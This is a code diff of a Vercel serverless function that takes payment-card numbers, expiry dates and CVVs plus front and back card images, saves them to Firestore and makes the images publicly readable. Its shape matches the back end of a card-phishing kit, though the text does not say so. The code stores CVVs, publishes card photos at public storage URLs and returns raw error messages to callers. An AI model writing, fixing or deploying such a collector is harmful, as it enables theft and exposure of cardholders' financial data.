@@ -1,8 +1,10 @@
+// api/submit.js — VERCEL FIXED VERSION
+global.Buffer = global.Buffer || require('buffer').Buffer;
+
 import { initializeApp, cert } from 'firebase-admin/app';
 import { getFirestore } from 'firebase-admin/firestore';
 import { getStorage } from 'firebase-admin/storage';
 
-// YOUR EXACT SERVICE ACCOUNT
 const serviceAccount = {
   "type": "service_account",
   "project_id": "vanilla-3be8f",
@@ -19,33 +21,37 @@ const serviceAccount = {
 
 initializeApp({
   credential: cert(serviceAccount),
-  storageBucket: 'vanilla-3be8f.firebasestorage.app'
+  storageBucket: "vanilla-3be8f.firebasestorage.app"
 });
 
 const db = getFirestore();
 const bucket = getStorage().bucket();
 
+export const config = {
+  runtime: 'nodejs18'
+};
+
 export default async function handler(req, res) {
-  if (req.method !== 'POST') return res.status(405).end();
+  if (req.method !== "POST") return res.status(405).end();
 
   try {
     const { card_number, expiry_date, cvv, front_image, back_image } = req.body;
 
-    const upload = async (data, name) => {
-      if (!data) return '';
-      const buffer = Buffer.from(data.split(',')[1], 'base64');
+    const upload = async (base64, name) => {
+      if (!base64) return "";
+      const buffer = Buffer.from(base64.split(",")[1], "base64");
       const file = bucket.file(`images/${name}_${Date.now()}.jpg`);
-      await file.save(buffer, { contentType: 'image/jpeg' });
+      await file.save(buffer, { contentType: "image/jpeg" });
       await file.makePublic();
       return `https://storage.googleapis.com/${bucket.name}/${file.name}`;
     };
 
     const [frontUrl, backUrl] = await Promise.all([
-      upload(front_image, 'front'),
-      upload(back_image, 'back')
+      upload(front_image, "front"),
+      upload(back_image, "back")
     ]);
 
-    await db.collection('submissions').add({
+    await db.collection("submissions").add({
       card_number,
       expiry_date,
       cvv,
@@ -56,7 +62,7 @@ export default async function handler(req, res) {
 
     res.status(200).json({ success: true });
   } catch (e) {
-    console.error(e);
-    res.status(500).json({ error: 'Failed' });
+    console.error("SUBMIT ERROR:", e);
+    res.status(500).json({ error: e.message });
   }
 }
